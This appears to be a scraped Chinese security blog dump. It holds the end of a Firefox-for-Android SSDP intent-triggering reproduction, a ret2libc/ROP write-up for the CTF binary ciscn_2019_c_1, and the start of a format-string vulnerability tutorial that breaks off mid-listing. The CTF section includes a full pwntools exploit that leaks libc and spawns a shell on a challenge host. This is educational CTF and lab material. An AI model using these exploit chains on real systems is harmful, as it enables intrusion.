&lt;serviceType&gt;urn:roku.com:service:ecp:1&lt;/serviceType&gt;        &lt;serviceId&gt;urn:roku.com:serviceId:ecp&lt;/serviceId&gt;        &lt;controlURL&gt;/control&lt;/controlURL&gt;      &lt;/service&gt;    &lt;/serviceList&gt;  &lt;/device&gt;&lt;/root&gt;\n3.启动服务\npython -m http.server 8080 --bind 0.0.0.0\n4.在虚拟机启动脚本\n└─# python3 ./ffssdp.py eth0 -t &quot;http://192.168.165.49:8080/device.xml&quot; \n这是部分流量文件\nM-SEARCH * HTTP/1.1HOST: 239.255.255.250:1900MAN: &quot;ssdp:discover&quot;MX: 2ST: roku:ecpHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 07:53:00 GMTEXT:LOCATION: http://192.168.165.49:8080/device.xmlOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:ddc5543d-9945-5a23-62be-360ea199a831SERVER: UPnP/1.0ST: roku:ecpUSN: uuid:ddc5543d-9945-5a23-62be-360ea199a831::roku:ecpBOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\n文件被访问了此外在调试中发现，开启reqable尝试对firefox进行抓包时，无反应，关掉reqable时才开始正常访问xml文件启用 Firefox 网络监控在 Firefox 地址栏输入：\nabout:networking\n可以看到的确是访问了目标xml文件\n为了追踪其来源，编写了server.py文件\nfrom http.server import SimpleHTTPRequestHandlerimport loggingclass CustomHandler(SimpleHTTPRequestHandler):    def log_request(self, code=&#x27;-&#x27;, size=&#x27;-&#x27;):        logging.info(            f&quot;UA:&#123;self.headers[&#x27;User-Agent&#x27;]&#125; | IP:&#123;self.client_address[0]&#125; | PATH:&#123;self.path&#125;&quot;        )if __name__ == &#x27;__main__&#x27;:    import logging    logging.basicConfig(        filename=&#x27;access.log&#x27;,        level=logging.INFO,        format=&#x27;%(asctime)s - %(message)s&#x27;    )    from http.server import HTTPServer    server = HTTPServer((&#x27;0.0.0.0&#x27;, 8080), CustomHandler)    server.serve_forever()\n这是部分日志\n2025-04-19 16:18:18,891 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml2025-04-19 16:18:19,890 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml2025-04-19 16:18:20,898 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml...\n在这份日志里只有firefox的记录，也就是说，http请求的确是firefox在处理\n\n这说明该漏洞不是简单的将LOCATION当成Intent 执行，对于http:&#x2F;&#x2F;和https:&#x2F;&#x2F;这样的标准的字段它有自己的处理模式，而对于非常规范围内的tel:&#x2F;&#x2F; 或 intent:&#x2F;&#x2F; 的处理路径它将其转发给了安卓处理\n参考资料https://initblog.com/2020/firefox-android/另一个视角的博客:https://blog.mozilla.org/attack-and-defense/2020/11/10/firefox-for-android-lan-based-intent-triggering/?utm_source=chatgpt.comfirefox官网，在这里查找漏洞信息:https://www.mozilla.org/en-US/security/advisories/https://developer.android.com/reference/android/app/ActivityManagerhttps://developer.android.com/guide/components/intents-filters?hl=zh-cnAndroid 开源项目 (AOSP) 源代码 :cs.android.com\n"},{"title":"从ciscn_2019_c_1看ret2libc","url":"/2024/09/26/%E4%BB%8Eciscn-2019-c-1%E7%9C%8Bret2libc/","content":"前置分析检查保护\n└─$ checksec &#x27;/home/pwn/ciscn_2019_c_1&#x27; [*] &#x27;/home/pwn/ciscn_2019_c_1&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n主函数\n\n关键函数，里面有个数组s,然后还有一些过滤和判断，这里是对字符进行分类然后异或\ndef encrypt2(c):    if 0x60 &lt; c &lt;= 0x7a:  # 26个小写英文字母        c = c^0xD    elif 0x40 &lt; c &lt;= 0x5a:  # 26个大写英文字母        c = c^0xE    elif 0x2f &lt; c &lt;= 0x39:  # 0-9        c = c^0xF    # 非数字和英文字母不做处理    return c\n\n\n存在gets函数且没有检查输入，则有机会利用函数进行溢出\nputs(&quot;Input your Plaintext to be encrypted&quot;);gets(s);\n\n开始做题构造思路首先需要造成溢出，才能去执行构造好的payload\nchar s[48]; // [rsp+0h] [rbp-50h] BYREF__int16 v3; // [rsp+30h] [rbp-20h]gets(s);\n\n溢出点在gets（s）,所以先要填充0x50+0x8&#x3D;0x58,0x8是函数返回地址\n也可以选择自己计算出溢出量\n\n在pwntools库中，cyclic函数用于生成一个特定的字符串，这个字符串包含了重复的、可预测的模式，这样在缓冲区溢出时可以更容易地找到偏移量。cyclic_find函数则用于在给定的输入中找到特定模式的偏移量。\n\n#使用pwntool生成循环字符from pwn import *print(cyclic(128))# b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#x27;\n\n使用gdb进行调试\n首先运行程序，发送cyclic字符（aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab）\n出现段错误后获取出现错误的地址，0x400aee,查看程序视图也可以得出0x400aee是encrypt函数的返回地址\n┌──(pwn㉿kali)-[~/桌面]└─$  &#x27;/home/pwn/桌面/ciscn_2019_c_1&#x27;                                                                                                                    EEEEEEE                            hh      iii                EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ====================================================================Welcome to this Encryption machine====================================================================1.Encrypt2.Decrypt3.ExitInput your choice!1Input your Plaintext to be encryptedaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabCiphertextllllolllnlllilllhlllkllljlllellldlllglllflllalll`lllclllblll&#125;lll|llllll~lllylllxlll&#123;lllzlllullltlllwlloollonlloillohllokllojllo段错误┌──(pwn㉿kali)-[~/桌面]└─$ dmesg |tail -n1                                                                                                                                                        [ 3660.583627] traps: ciscn_2019_c_1[30910] general protection fault ip:400aee sp:7fffc2f5aab8 error:0 in ciscn_2019_c_1[400000+2000]\n\n使用gdb,按照上面的流程运行程序\n└─$ gdb ./ciscn_2019_c_1  pwndbg&gt; rpwndbg&gt; x/gx $rsp0x7fffffffddb8: 0x6c6c6c756c6c6c7apwndbg&gt; x/s $rsp0x7fffffffddb8: &quot;zlllullltlllwlloollonlloillohllokllojllo&quot;\n\n然后开始处理得到的数据zlllullltlllwlloollonlloillohllokllojllo，最终计算得出偏移大小为88，也就是0x58\n#进行异或，因为encrypt函数会对输入的小写字母进行^0xDoriginal_string = &quot;zlllullltlllwlloollonlloillohllokllojllo&quot;  #这串字符将在gdb调试中获得xor_value = 0xDfirst_xor = xor_string(original_string, xor_value)print(first_xor)#waaaprint(cyclic_find(&#x27;waaa&#x27;))#88\n\nret2libc和ROP怎么利用？\n在前面的分析中，可以得知，这些函数本身并不存在后门函数，既system()，”&#x2F;bin&#x2F;sh“，execve（）之类,在这种情况下怎么利用呢？当然是跳出原文件限制，转而去利用原文件运行时链接的libc库，通过泄露libc地址来调用system或execve函数。\nret2libc 是一种绕过栈不可执行（NX bit）保护的攻击技术，主要用于通过标准 C 库（libc）中的函数，libc.so.6** 是 Linux 系统中的标准 C 库，包含了许多常见的函数。在 ret2libc 中，攻击者需要找到 libc 中 system() 函数和 /bin/sh 的地址。攻击者构造的 payload 将会覆盖返回地址为 system() 函数，且栈上紧跟着的参数为 /bin/sh。\nROP 是 ret2libc 的进阶形式，主要用于针对更高级别的安全措施，例如地址空间布局随机化（ASLR）。ROP 的核心思想是通过寻找程序中的 短指令序列（ROP gadget)，将它们组合起来构成可执行的指令链，从而达到执行恶意代码的目的。就像搭积木一样，找到合适的指令，然后重新组装，利用原有的指令来运行攻击代码。\n在ROP攻击中，每个函数调用（包括ROP gadget）都需要有一个返回地址。这是因为在正常的程序执行过程中，函数执行完后会通过栈上的返回地址回到调用它的地方。因此，你的payload必须指定每个函数或gadget执行完后跳转的地址。例如，第一次调用puts时，必须有返回地址main_addr以保证程序不崩溃，而第二次攻击中，system(&quot;/bin/sh&quot;)之后实际上不需要返回，但程序仍然会执行最后的返回操作。\n使用ROPgadget查找 gadgets\nROPgadget --binary ciscn_2019_c_1 --only &#x27;pop|ret&#x27;                                                             Gadgets information                                                                                                ============================================================                                                       0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret                                                   0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret                                                             0x0000000000400c80 : pop r14 ; pop r15 ; ret                                                                       0x0000000000400c82 : pop r15 ; ret                                                                                 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret                                         0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret                                                             0x00000000004007f0 : pop rbp ; ret                                                                                 0x0000000000400aec : pop rbx ; pop rbp ; ret                                                                       0x0000000000400c83 : pop rdi ; ret0x0000000000400c81 : pop rsi ; pop r15 ; ret0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02Unique gadgets found: 15\n\n可用的gadget0x0000000000400c83 : pop rdi ; ret\n如何找到呢？\nlibc库的内容是动态装载到进程空间的，里边的函数和变量的地址只能在运行时定位。下面是找到具体地址的步骤。\n1.寻找libc库基址这里使用利用puts（）函数来泄露libc基址（也不一定要用puts,用gets也行，这一步是为了计算出libc基址）\n方法1——使用python代码自动获取 （推荐）\n\n由于 ELF 文件的程序在编译时并不知道动态链接库中的函数地址，因此它使用 GOT 和 PLT 来进行延迟绑定（lazy binding）。第一次调用时，PLT 会解决函数地址并存储在 GOT 中，之后所有对该函数的调用都直接从 GOT 中取地址。\n\nGOT 表中存储的 puts 地址是程序运行时实际使用的 puts 函数地址，而这个地址位于 libc 中。一旦我们通过 puts 函数输出了 GOT 表中 puts 的实际地址，我们就可以根据已知的 puts 在 libc 中的偏移量，计算出整个 libc 的基址。\nelf = ELF(&#x27;./ciscn_2019_c_1&#x27;) main_addr = 0x400B28 pop_rdi = 0x400C83  puts_got = elf.got[&#x27;puts&#x27;]   #puts 函数在 GOT（Global Offset Table，全局偏移表）中的地址puts_plt = elf.plt[&#x27;puts&#x27;]   #puts 函数在 PLT（Procedure Linkage Table，过程链接表）中的地址payload = &#x27;1&#x27;*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\n\npayload解析\n(1) &#x27;1&#x27;*0x58这是填充数据，用来覆盖栈上到返回地址之间的空间，0x58（88 字节）具体大小是通过调试得出的，它是为了确保接下来的地址恰好覆盖函数返回地址。(2) p64(pop_rdi)这是一个 gadget，即一段指令：pop rdi; ret。在 x86-64 架构的调用约定中，rdi 寄存器是用来传递第一个函数参数的。通过这个 gadget，我们将 puts_got 地址放入 rdi 中，作为参数传递给 puts 函数。(3) p64(puts_got)这是 puts 函数在 GOT 中的地址。这里的目的是将 puts_got 的地址作为参数传递给 puts 函数。换句话说，puts 函数会将 GOT 表中 puts 函数的地址 打印出来。这是关键一步，它让我们能够知道 puts 函数的实际地址。(4) p64(puts_plt)这是 puts 函数在 PLT 中的地址。通过调用 PLT 中的 puts，程序会实际调用 puts 函数，并将我们传入的参数（即 puts_got 中的地址）作为 puts 的输出内容。这样，puts 函数会输出 GOT 表中存储的 puts 函数的真实地址。(5) p64(main_addr)在 puts 函数执行完成后，程序返回到主函数 main，从而可以让程序重新执行并等待新的输入。我们利用这一点，在泄露 puts 地址后，重新回到主函数，继续我们的攻击。因为泄露基址只是第一步，接下来还要接着利用基址来执行代码操作\n\n方法2——手动查找\n（手动查找时是在本地进行查找，无法获取和靶机一样的环境，因此会因为libc库版本的差异而导致基址不准，所以还是建议使用代码自动获取基址）\n\nputs()函数在encrypt()函数末尾，disass encrypt找到puts()函数调用的位置\n\npwndbg&gt; disass encryptDump of assembler code for function encrypt:   0x00000000004009a0 &lt;+0&gt;:     push   rbp   ...   ...   0x0000000000400ad1 &lt;+305&gt;:   mov    edi,0x400cd5   0x0000000000400ad6 &lt;+310&gt;:   call   0x4006e0 &lt;puts@plt&gt;   0x0000000000400adb &lt;+315&gt;:   lea    rax,[rbp-0x50]   0x0000000000400adf &lt;+319&gt;:   mov    rdi,rax   0x0000000000400ae2 &lt;+322&gt;:   call   0x4006e0 &lt;puts@plt&gt;   0x0000000000400ae7 &lt;+327&gt;:   nop   0x0000000000400ae8 &lt;+328&gt;:   add    rsp,0x48\n\n\n打断点 b *encrypt+322,然后查看puts（）的实际地址\n\npwndbg&gt; b *encrypt+322Breakpoint 2 at 0x400ae2pwndbg&gt; rpwndbg&gt; p puts$1 = &#123;int (const char *)&#125; 0x7ffff7e36640 &lt;__GI__IO_puts&gt;\n\n\n接下来需要知道 puts 在 libc 库中的偏移量\n\n可以使用info proc mappings看到libc库的路径\npwndbg&gt; info proc mappings...      0x7ffff7dbc000     0x7ffff7dbf000     0x3000        0x0  rw-p         0x7ffff7dbf000     0x7ffff7de5000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6      0x7ffff7de5000     0x7ffff7f3c000   0x157000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6...\n\n使用 readelf 或 nm 来查看 libc.so.6 中函数的偏移地址：\n└─$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts                                                        530: 0000000000112760   770 FUNC    GLOBAL DEFAULT   16 putsgent@@GLIBC_2.10   820: 0000000000075dd0   418 FUNC    WEAK   DEFAULT   16 fputs@@GLIBC_2.2.5   972: 00000000001110b0  1360 FUNC    GLOBAL DEFAULT   16 putspent@@GLIBC_2.2.5  1461: 0000000000077640   530 FUNC    WEAK   DEFAULT   16 puts@@GLIBC_2.2.5  1470: 0000000000077640   530 FUNC    GLOBAL DEFAULT   16 _IO_puts@@GLIBC_2.2.5└─$ nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts0000000000075dd0 W fputs@@GLIBC_2.2.50000000000080660 W fputs_unlocked@@GLIBC_2.2.50000000000075dd0 T _IO_fputs@@GLIBC_2.2.50000000000077640 T _IO_puts@@GLIBC_2.2.50000000000077640 W puts@@GLIBC_2.2.50000000000112760 T putsgent@@GLIBC_2.1000000000001110b0 T putspent@@GLIBC_2.2.5\n\n\nreadelf查看 ELF 文件的符号表，其中列出了 libc.so.6 中的所有全局函数和数据。它表示puts() 是一个 弱符号（WEAK），地址是 0000000000077640。\n\nnm 查看动态符号表 中的符号，包括动态链接库中的符号。\n\n由此得出puts()的偏移地址0000000000077640。\n\n\n\n计算libc基址\n\n计算出结果为：0x7ffff7dbf000\nputs_leaked=0x7ffff7e36640puts_offset=0x77640libc_base = puts_leaked - puts_offset\n\n验证下,刚好在，由此得出libc基址为0x7ffff7dbf000\npwndbg&gt; info proc mappingsprocess 143698Mapped address spaces:          Start Addr           End Addr       Size     Offset  Perms  objfile            0x400000           0x402000     0x2000        0x0  r-xp   /home/pwn/桌面/ciscn_2019_c_1            0x601000           0x602000     0x1000     0x1000  r--p   /home/pwn/桌面/ciscn_2019_c_1            0x602000           0x603000     0x1000     0x2000  rw-p   /home/pwn/桌面/ciscn_2019_c_1      0x7ffff7dbc000     0x7ffff7dbf000     0x3000        0x0  rw-p         0x7ffff7dbf000     0x7ffff7de5000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6      0x7ffff7de5000     0x7ffff7f3c000   0x157000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6\n\n2.计算后门代码偏移及地址方法1——利用LibcSearcher\n\n这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位。\n\n实际地址则是程序运行之后，函数在内存中的地址，是一个随机的基址加上libc里面函数的地址，当你后面用ROP时候，需要有个基址才能正确调用内存中的函数.\n接着利用puts函数来获取system和&#x2F;bin&#x2F;sh\np.recvuntil(&#x27;Ciphertext\\n&#x27;)p.recvuntil(&#x27;\\n&#x27;)puts_addr = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))log.success(&#x27;puts_addr = &#x27; + hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)log.success(&#x27;libcbase = &#x27; + hex(libcbase))sys_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)\n\n方法2——一个个找\n\n找system（）地址\n\n使用 readelf 或 nm 来查看 libc.so.6 中函数的偏移地址：\n└─$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system  1513: 000000000004dab0    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5└─$ nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system                                                        000000000004dab0 T __libc_system@@GLIBC_PRIVATE0000000000148710 T svcerr_systemerr@GLIBC_2.2.5000000000004dab0 W system@@GLIBC_2.2.5\n\n\n**__libc_system：这是 libc 的内部实现版本，标记为 GLIBC_PRIVATE，只在库的内部使用。system**：这是全局可访问的函数，标记为 GLIBC_2.2.5。\n\n由此得出system的偏移地址0x000000000004dab0。\n\n\n\n找&#x2F;bin&#x2F;sh地址\n\n&#x2F;bin&#x2F;sh并不是一个符号表中的符号，而是一个字符串常量，嵌入在 libc 的数据段中，所以不能用redelf和nm来获得。可以使用pwntools获得。得到地址0x197e34\nfrom pwn import *libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;))print(hex(binsh_addr))——$ python3 t2.py[*] &#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled0x197e34\n\n&#x2F;bin&#x2F;sh和system（）的地址为libc的基址加上它们各自的偏移\nlibc_base=system_offset=0x4dab0binsh_offset=0x197e34system_address =libc_base+system_offsetbinsh_address=libc_nase+binsh_offset\n\n构造payload前面已经：实现溢出，获得后门函数地址，接下来就是组合它们，使它们可执行。\n栈对齐是ubuntu18后的一个机制，就是函数结束时候由于一些出入栈的操作导致栈地址不能向8位或16位对齐，需要对齐之后才能使用函数(timeout就是内存错误，有可能就是没有栈对齐)\nret=0x400c84   payload = b&#x27;1&#x27;*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)\n\n关于ret的值：\nret是一个返回地址，0x400c84是我objdump -M intel -d &#39;./ciscn_2019_c_1&#39;后找到的一个ret地址，前面\nROPgadget --binary ciscn_2019_c_1 --only &#39;pop|ret&#39; 得到的那个ret值0x4006b9也能用，但是它返回的shell一次只能执行一个指令（我执行完ls后它就结束了），换成0x400c84后就能一次执行完ls和cat flag。问题不大，选中能用的ret就可以了。\n虽说这个ret在这里只是一个补齐栈的作用，但如果是随意设置值，比如0x400001之类无意义的值，payload最后会出现红色的$符号，但是无法执行任何命令，或者是说无法回显命令执行结果。\n\n关于puts函数返回值的处理：\nputs输出会将\\x00作为截断字符，假设函数地址后面3个字节为0，接收8个字节就会将函数地址后面输出的3个字节当做函数地址的最后3个字节，导致函数地址不正确，LibcSearcher对比的是最后12位，自然找不到正确的Libc\n完整的payload如下：\nfrom pwn import *from LibcSearcher import*p=remote(&#x27;node5.buuoj.cn&#x27;,29552)elf=ELF(&#x27;./ciscn_2019_c_1&#x27;) p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)main_addr = 0x400B28 pop_rdi = 0x400C83  puts_got = elf.got[&#x27;puts&#x27;]   puts_plt = elf.plt[&#x27;puts&#x27;]   payload = b&#x27;1&#x27;*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.recvuntil(&#x27;Ciphertext\\n&#x27;)p.recvuntil(&#x27;\\n&#x27;)puts_addr = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))log.success(&#x27;puts_addr = &#x27; + hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)log.success(&#x27;libcbase = &#x27; + hex(libcbase))sys_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)ret=0x400c84payload = b&#x27;1&#x27;*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.interactive()\n\n运行到第一个payload后会让你选择libc版本，选2.27的那个。因为题目提供的靶机是Ubuntu 18，而Ubuntu 18.04 稳定版本的 glibc 是2.27，可以在网上查到不同Ubuntu版本相对应的libc版本\n\nUbuntu 18.04 LTS: glibc 2.27\n\n成功\n\n\n一些报错\nBytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n重新捋了一遍代码的运行逻辑，换了一下send数据的时机就好了\nLibcSearch模块缺失：第一次安装是安装作者写的方法 python setup.py develop,安装失败，然后改为直接pip install libcsearch ,安装成功\n\n扩展知识x86 和 x86_64 的ROP差异在 x86 和 x86_64 两种架构下、ROP 方法的 payload 组织方式有所不同：\n\nx86 非syscall:\n\n参数通过栈传递，因此一般无需pop和ret指令；\n\n函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置\n\nprologue: push ebp;mov ebp, esp\n\nepilogue: leave;ret\n\n\n\n组织形式：FUNCTION ADDR + RETURN ADDR + ARGUMENT_0...N\n\n如果要实现执行多个函数，RETURN ADDR需要使用ROP gadget\n\n\n\n\nx86_64 非syscall:\n\n前6个参数依次通过寄存器传递： RDI, RSI, RDX, RCX, R8, R9\n\ngadget 均包含ret指令；\n\n组织形式：GADGET_0 ADDR + ARGUMENT_0 + GADGET_1 ADDR + … + GADGET_N ADDR + ARGUMENT_N + FUNCTION ADDR\n\n\n\n\n参考以及推荐https://blog.csdn.net/qinying001/article/details/103266763\nhttp://liul14n.top/2020/01/29/ciscn-2019-c-1/\nhttps://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html\nhttps://kayoch1n.github.io/blog/buuoj-pwn-rop-ciscn_2019_c_1/\n"},{"title":"格式化字符串漏洞","url":"/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","content":"介绍首先来看printf,这是常用的格式化字符串函数，以下是常见用法，能利用%s,%d等来替换不同的值\nprintf(&quot;Hello!\\n&quot;);printf(&quot;Hello %s!\\n&quot;, name);printf(&quot;There are %d lights!&quot;, 5);printf(&quot;The average of %d, %d, and %d is %f&quot;, 1, 2, 3, float(1+2+3)/3.0);\n\n但是printf是怎么知道有多少个值的？\n格式化字符串决定了printf打印的参数类型，那么这些参数在哪里？\n比如给定了许多%s,但没有指定参数传递，printf如何打印？\nprintf(&quot;Hello %s!\\n&quot;);\n\n来看看会调用printf时的汇编代码\n#include&lt;stdio.h&gt;int main(int argc,char** argv)&#123;  int a=1;  int b=2;  int c=3;  int d=4;  int e=5;  int f=6;  int g=7;  printf(&quot;%d %d %d %d %d %d %d\\n&quot;,a,b,c,d,e,f,g);  return 0;&#125;\n\n启用gdb，看printf是怎么调用函数的\nFor help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...pwndbg: loaded 161 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)Reading symbols from ./do...(No debugging symbols found in ./do)------- tip of the day (disable with set show-tips off) -------Use Pwndbg&#x27;s config and theme commands to tune its configuration and theme colors!pwndbg&gt; disass mainDump of assembler code for function main:   0x0000000000001139 &lt;+0&gt;:     push   rbp   0x000000000000113a &lt;+1&gt;:     mov    rbp,rsp   0x000000000000113d &lt;+4&gt;:     sub    rsp,0x30   0x0000000000001141 &lt;+8&gt;:     mov    DWORD PTR [rbp-0x24],edi   0x0000000000001144 &lt;+11&gt;:    mov    QWORD PTR [rbp-0x30],rsi   0x0000000000001148 &lt;+15&gt;:    mov    DWORD PTR [rbp-0x4],0x1                                   0x000000000000114f &lt;+22&gt;:    mov    DWORD PTR [rbp-0x8],0x2                                                                    0x0000000000001156 &lt;+29&gt;:    mov    DWORD PTR [rbp-0xc],0x3                                                                    0x000000000000115d &lt;+36&gt;:    mov    DWORD PTR [rbp-0x10],0x4                                                                   0x0000000000001164 &lt;+43&gt;:    mov    DWORD PTR [rbp-0x14],0x5                                                                   0x000000000000116b &lt;+50&gt;:    mov    DWORD PTR [rbp-0x18],0x6                                                                   0x0000000000001172 &lt;+57&gt;:    mov    DWORD PTR [rbp-0x1c],0x7                                                                   0x0000000000001179 &lt;+64&gt;:    mov    r8d,DWORD PTR [rbp-0x14]                                                                   0x000000000000117d &lt;+68&gt;:    mov    edi,DWORD PTR [rbp-0x10]                                                                   0x0000000000001180 &lt;+71&gt;:    mov    ecx,DWORD PTR [rbp-0xc]                                                                    0x0000000000001183 &lt;+74&gt;:    mov    edx,DWORD PTR [rbp-0x8]                                                                    0x0000000000001186 &lt;+77&gt;:    mov    eax,DWORD PTR [rbp-0x4]                                                                    0x0000000000001189 &lt;+80&gt;:    mov    esi,DWORD PTR [rbp-0x1c]   0x000000000000118c &lt;+83&gt;:    push   rsi   0x000000000000118d &lt;+84&gt;:    mov    esi,DWORD PTR [rbp-0x18]   0x0000000000001190 &lt;+87&gt;:    push   rsi   0x0000000000001191 &lt;+88&gt;:    mov    r9d,r8d   0x0000000000001194 &lt;+91&gt;:    mov    r8d,edi   0x0000000000001197 &lt;+94&gt;:    mov    esi,eax   0x0000000000001199 &lt;+96&gt;:    lea    rax,[rip+0xe64]        # 0x2004   0x00000000000011a0 &lt;+103&gt;:   mov    rdi,rax   0x00000000000011a3 &lt;+106&gt;:   mov    eax,0x0   0x00000000000011a8 &lt;+111&gt;:   call   0x1030 &lt;printf@plt&gt;   0x00000000000011ad &lt;+116&gt;:   add    rsp,0x10   0x00000000000011b1 &lt;+120&gt;:   mov    eax,0x0   0x00000000000011b6 &lt;+125&gt;:   leave   0x00000000000011b7 &lt;+126&gt;:   retEnd of assembler dump.pwndbg&gt; \n\n在&lt;111&gt;处调用了printf\n在此处下断点 b *main +111\npwndbg&gt; b *main+111Breakpoint 1 at 0x11a8pwndbg&gt; r\n\n运行后看现在的寄存器里有什么\npwndbg&gt; info regrax            0x0                 0rbx            0x7fffffffdf28      140737488346920rcx            0x3                 3rdx            0x2                 2rsi            0x1                 1rdi            0x555555556004      93824992239620rbp            0x7fffffffde10      0x7fffffffde10rsp            0x7fffffffddd0      0x7fffffffddd0r8             0x4                 4r9             0x5                 5r10            0x7fffffffdb40      140737488345920r11            0x206               518r12            0x0                 0r13            0x7fffffffdf38      140737488346936r14            0x7ffff7ffd000      140737354125312r15            0x555555557dd8      93824992247256rip            0x5555555551a8      0x5555555551a8 &lt;main+111&gt;eflags         0x202               [ IF ]cs             0x33                51ss             0x2b                43ds             0x0                 0es             0x0                 0fs             0x0                 0gs             0x0                 0pwndbg&gt; \n\n对于寄存器的一些解释：\nrax (0x0): 通常用作返回值寄存器。值为 0 表示前一个函数调用返回了 0（通常表示成功，或者是布尔类型的 false）。rbx (0x7fffffffdf28): rbx 通常是一个保存寄存器，它的值为 140737488346920（内存地址），说明它保存了某个值或指向某个数据。rcx (0x3): rcx 经常在某些函数调用约定中用于传递参数。当前值为 3，表明它可能作为一个函数的第三个参数或计数值。rdx (0x2): rdx 通常用于传递第二个函数参数，当前值为 2，表明这个值可能被用作函数调用中的某个参数。rsi (0x1): rsi 通常是传递第一个函数参数。当前值为 1，很可能是某个函数的标志参数或索引。rdi (0x555555556004): rdi 经常传递第一个函数参数，当前值为 93824992239620，这是一个内存地址，可能指向函数的输入数据或结构体。rbp (0x7fffffffde10): rbp 是基址指针，通常用于指向栈帧的基址。当前值指向栈帧顶部，表示函数的局部变量和参数保存在这一段内存区域中。rsp (0x7fffffffddd0): rsp 是栈指针，表示当前栈的顶部。当前值 0x7fffffffddd0 小于 rbp，符合栈从高地址向低地址增长的特性。r8 (0x4), r9 (0x5): 这些寄存器在某些调用约定下用于传递函数参数，值分别为 4 和 5。r10 (0x7fffffffdb40): 这是一个内存地址，可能用作系统调用的第三个参数或者是某个函数的额外参数。r11 (0x206): 通常用作标志寄存器。当前值 0x206 可能与系统调用相关。r12 (0x0): r12 是一个保存寄存器，当前值为 0，表示它可能还未被使用。r13 (0x7fffffffdf38): 这是一个内存地址，通常保存了一个值或指向某个数据区域。r14 